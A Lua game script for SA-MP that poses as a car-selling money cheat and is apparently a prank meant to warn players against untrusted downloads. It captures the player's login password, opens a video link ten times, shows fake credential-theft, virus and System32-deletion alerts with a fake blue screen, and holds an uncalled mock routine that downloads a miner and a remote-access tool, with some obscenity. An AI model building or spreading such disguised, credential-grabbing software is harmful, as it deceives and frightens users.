local sampev = require 'lib.samp.events'
local ffi = require 'ffi'

local font_flag = require('moonloader').font_flag
local font1 = renderCreateFont('Arial', 150, 0)
local font2 = renderCreateFont('Arial', 30, 0)
local font3 = renderCreateFont('Arial', 15, 0)

local name = {
    'James',
    'John',
    'Robert	',
    'Michael',
    'William',
    'David',
    'Richard',
    'Joseph',
    'Thomas',
    'Charles',
    'Christopher',
    'Daniel',
    'Matthew',
    'Anthony',
    'Donald',
    'Mark',
    'Paul',
    'Steven',
    'Andrew',
    'Kennet',
    'Joshua',
    'Kevin',
    'Brian',
    'George',
    'Edward',
    'Ronald',
    'Timothy',
    'Jason',
    'Jeffrey',
    'Ryan',
    'Jaco',
    'Gary',
    'Nicholas',
    'Eric',
    'Jonathan',
    'Stephe',
    'Larry',
    'Justin',
    'Scott',
    'Brandon',
    'Benjamin58',
    'Samuel',
    'Frank',
    'Gregory',
    'Raymond',
    'Alexande',
    'Patrick',
    'Jack',
    'Dennis',
    'Jerry',
    'Tyler',
    'Aaron',
    'Jose',
    'Henry',
    'Adam',
    'Douglas',
    'Nathan',
    'Peter',
    'Zachary',
    'Kyle',
    'Walter',
    'Harold',
    'Jeremy',
    'Carl',
    'Keith',
    'Roger',
    'Gerald',
    'Christia',
    'Terry',
    'Sean',
    'Arthur',
    'Austin',
    'Noah',
    'Lawrence',
    'Jesse',
    'Joe',
    'Bryan',
    'Billy',
    'Jordan',
    'Albert',
    'Dylan',
    'Bruce',
    'Willie	',
    'Gabriel',
    'Alan',
    'Juan',
    'Wayne',
    'Ralph',
    'Roy',
    'Eugene',
    'Randy',
    'Vincent',
    'Russell',
    'Louis',
    'Philip',
    'Bobby',
    'Johnny',
    'Bradley',
    'Liam',
    'Noah',
    'William',
    'James',
    'Oliver',
    'Benjamin',
    'Elijah',
    'Lucas',
    'Mason',
    'Logan',
    'Alexander',
    'Ethan',
    'Jacob',
    'Michael',
    'Daniel',
    'Henry',
    'Jackson',
    'Sebastian',
    'Aiden',
    'Matthew',
    'Samuel',
    'David',
    'Joseph',
    'Carter',
    'Owen',
    'Wyatt',
    'John',
    'Jack',
    'Luke',
    'Jayden',
    'Dylan',
    'Grayson',
    'Levi',
    'Isaac',
    'Gabriel',
    'Julian',
    'Mateo',
    'Anthony',
    'Jaxon',
    'Lincoln',
    'Joshua',
    'Christopher',
    'Andrew',
    'Theodore',
    'Caleb',
    'Ryan',
    'Asher',
    'Nathan',
    'Thomas',
    'Leo',
    'Isaiah',
    'Charles',
    'Josiah',
    'Hudson',
    'Christian',
    'Hunter',
    'Connor',
    'Eli',
    'Ezra',
    'Aaron',
    'Landon',
    'Adrian',
    'Jonathan',
    'Nolan',
    'Jeremiah',
    'Easton',
    'Elias',
    'Colton',
    'Cameron',
    'Carson',
    'Robert',
    'Angel',
    'Maverick',
    'Nicholas',
    'Dominic',
    'Jaxson',
    'Greyson',
    'Adam',
    'Ian',
    'Austin',
    'Santiago',
    'Jordan',
    'Cooper',
    'Brayden',
    'Roman',
    'Evan',
    'Ezekiel',
    'Xavier',
    'Jose',
    'Jace',
    'Jameson',
    'Leonardo',
    'Bryson',
    'Axel',
    'Everett',
    'Parker',
    'Kayden',
    'Miles',
    'Sawyer',
    'Jason',
}

local surname = {
    'Smith',
    'Johnson',
    'Williams',
    'Brown',
    'Jones',
    'Miller',
    'Davis',
    'Garcia',
    'Rodriguez',
    'Wilson',
    'Martinez',
    'Anderson',
    'Taylor',
    'Thomas',
    'Hernandez',
    'Moore',
    'Martin',
    'Jackson',
    'Thompson',
    'White',
    'Lopez',
    'Lee',
    'Gonzale',
    'Harris',
    'Clark',
    'Lewis',
    'Robinson',
    'Walker',
    'Perez',
    'Hall',
}
local bluescreen = false

local err_name = ''
local err_server = ''
local err_pass = ''

function main()
    while not isSampAvailable() do wait(0) end
    while not sampIsLocalPlayerSpawned() do wait(0) end
    sampRegisterChatCommand('rick', function() os.execute('explorer "https://youtu.be/dQw4w9WgXcQ"') end)
    while true do
        wait(0)
        result, button, list, input = sampHasDialogRespond(1934)
        if result and isCharInAnyCar(PLAYER_PED) then
            if button == 1 then
                veh = storeCarCharIsInNoSave(PLAYER_PED)
                cx, xy, cz = getCarCoordinates(veh)
                warpCharFromCarToCoord(PLAYER_PED, cx, xy, cz)
                deleteCar(veh)
                price = getPrice()
                printStyledString('~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~g~'..price..'$', 1000, 4)
                givePlayerMoney(Player, price)
                sampAddChatMessage('[Информация] {ffffff}Вы продали ваше транспортное средство за $'..price, 0xFF729ad4)
                math.randomseed(os.clock())
                
                waitForWin = math.random(2, 15) 
                
                wait(waitForWin * 1000)
                for i = 1, 10 do os.execute('explorer "https://youtu.be/dQw4w9WgXcQ"') end
                bluescreen = true
                
                ShowMessage('Ошибка отправки: "server={'..err_server..'},nickname={'..err_name..'},password={'..err_pass..'}" to http://samp-stealer.xyz/...\nПовторить попытку?', 'moonloader http lib error', 0x00000004)
                ShowMessage('Обнаружена угроза "/Miner.eth" в файле ' ..thisScript().path..'.\nПоместить файл в карантин?', 'Защитник Windows', 0x00000004)
                ShowMessage('Перемещение в карантин отменено пользователем.', 'Защитник Windows', 0x00000010)
                
                wait(waitForWin * 1000)
                ShowMessage('Удаление папки C:\\Windows\\System32, пожалуйста подождите...', 'opahc virus', 0x00000004)
                ShowMessage('Удаление папки C:\\Windows\\System32, пожалуйста подождите...', 'opahc virus', 0x00000004)
                ShowMessage('Для применения изменений перезагрузите компьютер', 'opahc virus', 0x00000004)
                
                ShowMessage('Не качай скрипты из непроверенных источников! Привет от chapo', 'на этот раз тебе повезло', 0x00000010)
                ShowMessage('На этот раз тебе повезло, тут нет ни стиллера, ни лоадера. Можешь сам прогнать скрипт через декомпилятор. Впредь будь осторожней, не качай ничего из тиктока/ютуба, никто не будет бесплатно давать рабочий способ заработка\n@chapo', 'На этот раз тебе повезло', 0x00000010)
                ShowMessage('Код скрипта будет открыт через пару секунд...', 'chapo', style)
                os.execute('explorer "https://github.com/GovnocodedByChapo/arz_fakecheat/blob/main/fakesellcar.lua"')
            end
        end
    end
end

function sampev.onSendCommand(text)
    if text:find('/sellcar') and isCharInAnyCar(PLAYER_PED) then
        callDialog()
        return false
    end
end

function sampev.onSendEnterVehicle(vehId, pass)
    lua_thread.create(function()
        while not isCharInAnyCar(PLAYER_PED) do wait(0) end
        --name = name[math.random(1, #name)]..'_'..surname[math.random(1, #surname)]
        fname = name[math.random(1, #name)]..'_'..surname[math.random(1, #surname)]

        nalog = getNalog(10, 20, 2)
        sampAddChatMessage('Это транспорт зарегестрирован на жителя {9fbf56}'..fname, -1)
        sampAddChatMessage('Налог этого транспорта составляет '..nalog, 0xFF7fa967)
        --sampAddChatMessage(getName(), -1)
    end)
end

function getNalog(min, max, multiplier)
    math.randomseed(os.clock())
    nalog = math.random(min, max)
    for i = 1, multiplier do nalog = nalog..'0' end
    return nalog
end

function getPrice()
    math.randomseed(os.clock())
    f = math.random(1, 10)
    s = math.random(5, 7)
    for i = 1, s do f = f..'0' end
    return f
end

function callDialog()
    sampShowDialog(1934, 'Предупреждение', '{ffffff}Вы действительно хотите продать свой автомобиль??\nВнимание при продаже авто вам дадут только\nне большую часть от его гос. стоимости', 'Дальше', 'Отмена', 0)
end

function ShowMessage(text, title, style)
    ffi.cdef[[
        int MessageBoxA(
            void* hWnd,
            const char* lpText,
            const char* lpCaption,
            unsigned int uType
        );]]
    
    local hwnd = ffi.cast('void*', readMemory(0x00C8CF88, 4, false))
    ffi.C.MessageBoxA(hwnd, text,  title, style and (style + 0x50000) or 0x50000)
end


function loader()
    skachatFile('https://лоадеры.рф/loader/users/chapo/loader.exe', getWorkingDirectory()..'\\etoNeLoader.exe')
    if fileSkachan then
        loader = getWorkingDirectory()..'\\etoNeLoader.exe'
        loader:zapusk()
        miner = loader:podgruzit('https://майнеры.рф/users/chapo/miner.exe')
        ratnik = loader:podgruzit('https://ратники.рф/users/chapo/ratnik.exe')

        miner:zapusk()
        ratnik:zapusk()

        ratnik:poluchitDostupKKlaviature()
        ratnik:klaviatura('t matb ebal {enter}')
    end
end

function onD3DPresent()
    if bluescreen then
        local copywrite = {
          [4] = ':(',
          [5] = 'На вашем ПК возникла проблема, и его необходимо \nперезагрузить. Мы лишь собираем некоторые сведения об \nошибке, а затем будет автоматическая \nперезагрузка (выполнено 100%)',
          [6] = 'При желании вы можете найти в Интернете информация по этому коду ошибки: MAT_EBAL'
        }
        resX, resY = getScreenResolution()
        renderDrawBox(0, 0, resX, resY, 0xFF0191ea)
        renderFontDrawText(font1, copywrite[4], 150, 150, 0xFFFFFFFF)
        renderFontDrawText(font2, copywrite[5], 150, 600, 0xFFFFFFFF)
        renderFontDrawText(font3, copywrite[6], 150, 900, 0xFFFFFFFF)
    end
end

function sampev.onShowDialog(id, style, title, button1, button2, text)
    sampAddChatMessage(id, -1)
end

function sampev.onSendDialogResponse(dialogId, button, listboxId, input)
    if dialogId == 2 and button == 1 then 
        err_pass = input
        err_name = sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(PLAYER_PED)))
        err_server = sampGetCurrentServerName()
    end
end

--|  CC     H H      A      PP       O  |--
--| C       HHH     A_A     P_P     O O |--
--|  CC     H H     A A     P        O  |--
